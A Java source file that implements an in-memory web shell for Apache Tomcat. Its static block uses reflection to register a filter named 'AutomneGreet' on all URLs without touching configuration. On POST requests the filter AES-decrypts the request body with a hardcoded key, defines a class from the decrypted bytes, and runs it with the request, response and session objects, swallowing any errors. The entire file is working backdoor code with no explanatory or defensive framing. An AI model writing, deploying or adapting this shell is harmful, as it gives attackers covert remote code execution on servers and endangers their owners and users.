import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class IFRain10 implements Filter {
    private final String pa = "3ad2fddfe8bad8e6";

    static{
        try{
            final String name = "AutomneGreet";
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Field Configs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
            Configs.setAccessible(true);
            Map filterConfigs = (Map) Configs.get(standardContext);

            if (filterConfigs.get(name) == null){
                Filter filter = new IFRain10();

                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName(name);
                filterDef.setFilterClass(filter.getClass().getName());

                standardContext.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName(name);
                filterMap.setDispatcher(DispatcherType.REQUEST.name());

                standardContext.addFilterMapBefore(filterMap);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

                filterConfigs.put(name,filterConfig);
            }
        }catch (Exception hi){
            //hi.printStackTrace();
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        HttpSession session = request.getSession();

        Map<String, Object> pageContext = new HashMap<String, Object>();
        pageContext.put("session", session);
        pageContext.put("request", request);
        pageContext.put("response", response);

        ClassLoader cl = (ClassLoader) Thread.currentThread().getContextClassLoader();

        if (request.getMethod().equals("POST")) {
            if (cl.getClass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else if (cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getName().equals("java.lang.ClassLoader")) {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            } else {
                Class Lclass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass().getSuperclass();
                RushThere(Lclass, cl, session, request, pageContext);
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
    }

    @Override
    public void destroy() {

    }

    public void RushThere(Class Lclass, ClassLoader cl, HttpSession session, HttpServletRequest request,Map<String, Object> pageContext){
        byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
        try {
            java.lang.reflect.Method define = Lclass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            define.setAccessible(true);
            Class uclass = null;
            try {
                uclass = cl.loadClass("U");
            } catch (ClassNotFoundException e) {
                uclass = (Class) define.invoke(cl, bytecode, 0, bytecode.length);
            }
            Constructor constructor = uclass.getDeclaredConstructor(ClassLoader.class);
            constructor.setAccessible(true);
            Object u = constructor.newInstance(this.getClass().getClassLoader());
            Method Um = uclass.getDeclaredMethod("g", byte[].class);
            Um.setAccessible(true);
            String k = pa;
            session.setAttribute("u", k);
            Cipher c = Cipher.getInstance("AES");
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
            byte[] eClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
            Class eclass = (Class) Um.invoke(u, eClassBytes);
            Object a = eclass.newInstance();
            Method b = eclass.getDeclaredMethod("equals", Object.class);
            b.setAccessible(true);
            b.invoke(a, pageContext);
            return;
        }catch (Exception ig){
            //ig.printStackTrace();
        }
    }

}


